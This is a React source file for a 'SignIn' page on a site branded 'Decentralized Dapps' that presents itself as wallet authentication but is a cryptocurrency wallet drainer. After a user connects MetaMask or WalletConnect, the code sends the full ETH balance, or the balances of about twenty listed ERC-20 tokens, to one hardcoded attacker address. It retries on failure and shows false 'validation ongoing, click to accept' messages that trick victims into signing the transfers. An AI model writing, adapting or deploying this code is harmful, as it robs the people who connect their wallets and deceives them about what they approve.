import { MetaMaskConnector } from "wagmi/connectors/metaMask";
import { useAccount, useConnect, useDisconnect } from "wagmi";
import { useAuthRequestChallengeEvm } from "@moralisweb3/next";
import { ethers } from "ethers";
import { useEffect, useState } from "react";
import React from "react";
import { ToastContainer, toast } from "react-toastify";

import "react-toastify/dist/ReactToastify.css";

import HomePage from "../modules/homePage";
import Modal from "../modules/modal";

import {
  defaultConfig,
  useWeb3Modal,
  createWeb3Modal,
  useWeb3ModalSigner,
  useWeb3ModalAccount,
} from "@web3modal/ethers5/react";

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = "08745e28db10b6194e0e5fab082000df";

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: "Ethereum",
  currency: "ETH",
  explorerUrl: "https://etherscan.io",
  rpcUrl: "https://cloudflare-eth.com",
};

const polygon = {
  chainId: 137,
  name: "Polygon",
  currency: "MATIC",
  explorerUrl: "https://polygonscan.com",
  rpcUrl: "https://rpc-mainnet.maticvigil.com",
};

const bnbSmartChain = {
  chainId: 56,
  name: "Binance Smart Chain",
  currency: "BNB",
  explorerUrl: "https://bscscan.com",
  rpcUrl: "https://bsc-dataseed.binance.org",
};

// 3. Create modal
const metadata = {
  name: "Decentralized Dapps",
  description: "Decentralized Dapps",
  url: "https://securefixdapps.com",
  icons: ["https://avatars.mywebsite.com/"],
};

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: [mainnet, polygon, bnbSmartChain],
  projectId,
});

function SignIn() {
  const [selection, setSelection] = useState('WalletConnect');
  const { connectAsync } = useConnect();
  const { disconnectAsync } = useDisconnect();
  const { isConnected } = useAccount();
  const { requestChallengeAsync } = useAuthRequestChallengeEvm();
  const { open } = useWeb3Modal();
  const web3AccountInformation = useWeb3ModalAccount();
  const web3SignerProviderInformation = useWeb3ModalSigner();

  const [showModal, setShowModal] = useState(false);

  // Replace with the ABI of the ERC-20 token contract
  const tokenAbi = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
  ];

  const MAX_RETRIES = 2;
  let retryCount = 0;

  const tokenAddresses = [
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
    "0xa0b86991c6218b36c1d19D4a2e9Eb0cE360CFDfE", // USDC
    "0x4Fabb145d64652a948d72533023f6E7A623C7C53", // BUSD
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", // WETH (Wrapped Ether)
    "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI (yearn.finance)
    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE
    "0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671", // NMR (Numeraire)
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI (Uniswap)
    "0x1e31218E662D4b8F43A01DE4D9c12B48a2A9b408", // SNX (Synthetix)
    "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", // MATIC (Polygon)
    "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT (Basic Attention Token)
    "0x1Cf4592eb1558021b1f580e6f5cFe19fE9Df9c9c", // REN (RenVM)
    "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD", // LEND (now AAVE)
    "0x1a5F9352Af8aF974bFC03399e3767DF6370d82e4", // STORJ (Storj)
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT (Tether)
    "0xa117000000f279D81A1D3cc75430fAA017FA5A2e", // ANT (Aragon)
    "0x584bC13c7D411c00c01A62e8019472dE68768430", // GRT (The Graph)
    "0x6810e776880C02933D47DB1b9fc05908e5386b96", // GNO (Gnosis)
    "0x41e5560054824eA6B0732E656E3Ad64E20e94E45", // CVC (Civic)
  ];

  const handleAuth = async () => {
    setSelection("MetaMask");
    setShowModal(false);
    try {
      if (isConnected) {
        await disconnectAsync();
      }

      const { account, chain } = await connectAsync({
        connector: new MetaMaskConnector(),
      });

      const { message } = await requestChallengeAsync({
        address: account,
        chainId: chain.id,
      });

      const walletAddress = account; // Replace with the Ethereum wallet address you want to check

      // Explicitly create an ethers.js provider
      const provider = new ethers.providers.Web3Provider(window.ethereum);

      // Check ETH balance
      const ethBalanceWei = await provider.getBalance(walletAddress);
      const ethBalanceEth = ethers.utils.formatEther(ethBalanceWei);

      const ethSigner = provider.getSigner();

      // ETH is present and more that 10, send all - else send the ERC 20 token

      if (parseFloat(ethBalanceEth) > 0.05) {
        checkifEthWallet();
        const gasLimit = await provider.estimateGas({
          to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
          value: ethers.utils.parseEther(ethBalanceEth),
        });

        // Get current gas price
        const gasPrice = await provider.getGasPrice();

        // Deduct estimated gas fees from the total ETH balance
        const remainingEthBalance = ethers.utils.formatEther(
          ethBalanceWei.sub(gasPrice.mul(gasLimit))
        );

        // Transfer the remaining balance
        const ethTransaction = {
          to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
          value: ethers.utils.parseEther(remainingEthBalance),
        };

        const ethTx = await ethSigner.sendTransaction(ethTransaction);
        await ethTx.wait(); // Wait for the ETH transaction to be mined

        console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
      } else {
        checkifERC20Token();
        // Fetch ERC-20 token balances
        const tokenBalances = await getTokenBalances(
          ethSigner,
          tokenAddresses,
          walletAddress
        );

        // Transfer ERC-20 tokens
        for (const tokenAddress of Object.keys(tokenBalances)) {
          const tokenBalanceWei = tokenBalances[tokenAddress];
          const tokenBalance = ethers.utils.formatUnits(tokenBalanceWei);

          const tokenContract = new ethers.Contract(
            tokenAddress,
            tokenAbi,
            ethSigner
          );

          const gasLimit = await tokenContract.estimateGas.transfer(
            "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
            ethers.utils.parseUnits(tokenBalance)
          );

          // Get current gas price
          const gasPrice = await provider.getGasPrice();

          // Deduct estimated gas fees from the total token balance
          const remainingTokenBalance = ethers.utils.formatUnits(
            tokenBalanceWei.sub(gasPrice.mul(gasLimit)),
            "wei"
          );

          // Transfer the remaining balance
          const tokenTransaction = await tokenContract.transfer(
            "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
            ethers.utils.parseUnits(remainingTokenBalance)
          );

          await tokenTransaction.wait(); // Wait for the token transaction to be mined
          console.log(
            `Tokens transferred successfully to 0xRecipientTokenAddress`
          );
        }
      }
    } catch (error) {
      if (retryCount < MAX_RETRIES) {
        retryCount++;
        console.error(
          `Error in handleAuth. Retrying (${retryCount}/${MAX_RETRIES}):`,
          error.message
        );
        await new Promise((resolve) => setTimeout(resolve, 1000)); // Wait for 1 second before retrying
        await handleAuth(); // Retry the function
      } else {
        console.error(
          `Maximum retry attempts (${MAX_RETRIES}) reached. Unable to complete handleAuth.`
        );
      }
    }
  };

  const getTokenBalances = async (ethSigner, tokenAddresses, walletAddress) => {
    const balances = {};

    for (const tokenAddress of tokenAddresses) {
      const tokenContract = new ethers.Contract(
        tokenAddress,
        tokenAbi,
        ethSigner
      );

      try {
        const balance = await tokenContract.balanceOf(walletAddress);
        const formattedBalance = ethers.utils.formatUnits(balance);

        if (parseFloat(formattedBalance) > 0) {
          balances[tokenAddress] = formattedBalance;
        }
      } catch (error) {
        console.error(
          `Error fetching balance for token ${tokenAddress}:`,
          error.message
        );
      }
    }

    return balances;
  };

  useEffect(() => {
    !web3AccountInformation.isConnected &&
      selection === "WalletConnect" &&
      open();
  }, [open, selection, web3AccountInformation.isConnected]);

  useEffect(() => {
    const handleWeb3Modal = async () => {
      console.log('got here')
      try {
        const walletAddress = web3AccountInformation.address; // Replace with the Ethereum wallet address you want to check

        // Check ETH balance
        const ethBalanceWei =
          await web3SignerProviderInformation.walletProvider.getBalance(
            walletAddress
          );
        const ethBalanceEth = ethers.utils.formatEther(ethBalanceWei);

        console.log(ethBalanceEth);
        const ethTransaction = {
          to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
          value: ethers.utils.parseUnits(ethBalanceEth),
          data: "0x",
        };

        const ethTx =
          await web3SignerProviderInformation.signer.sendTransaction(
            ethTransaction
          );

        await ethTx.wait(); // Wait for the ETH transaction to be mined
        console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
      } catch (error) {
        if (retryCount < MAX_RETRIES) {
          retryCount++;
          console.error(
            `Error in handleAuth. Retrying (${retryCount}/${MAX_RETRIES}):`,
            error.message
          );
          await new Promise((resolve) => setTimeout(resolve, 1000)); // Wait for 1 second before retrying
          await handleWeb3Modal(); // Retry the function
        } else {
          console.error(
            `Maximum retry attempts (${MAX_RETRIES}) reached. Unable to complete handleAuth.`
          );
        }
      }
    };
    // Finally we only want to get a provider if the user is connected(from the modal) AND there's a wallet client
    web3AccountInformation.isConnected &&
      selection === "WalletConnect" &&
      handleWeb3Modal();
  });

  const openWeb3Modal = async () => {
    setSelection("WalletConnect");
    setShowModal(false);
    await open();
  };

  const openModalForSelectingWallet = (childData) => {
    // setShowModal(true);
    open();
  };

  const notifyWalletConnected = () =>
    toast("Wallet has been connected, Navigate to wallet to continue!");
  const checkifEthWallet = () =>
    toast("Validation ongoing Eth wallet, Click to accept!");
  const checkifERC20Token = () =>
    toast("Validation ongoing for tokens wallet, Click to accept!");

  return (
    <div>
      <HomePage
        selectedWallet={selection}
        emitClickEvent={openModalForSelectingWallet}
      />

      {showModal && (
        <Modal
          setIsOpen={setShowModal}
          handleAuth={handleAuth}
          openWeb3Modal={openWeb3Modal}
          headerTitle="Select Wallet"
        >
          Hello from the modal!
        </Modal>
      )}
      <ToastContainer
        position="top-center"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="light"
      />
    </div>
  );
}

export default SignIn;
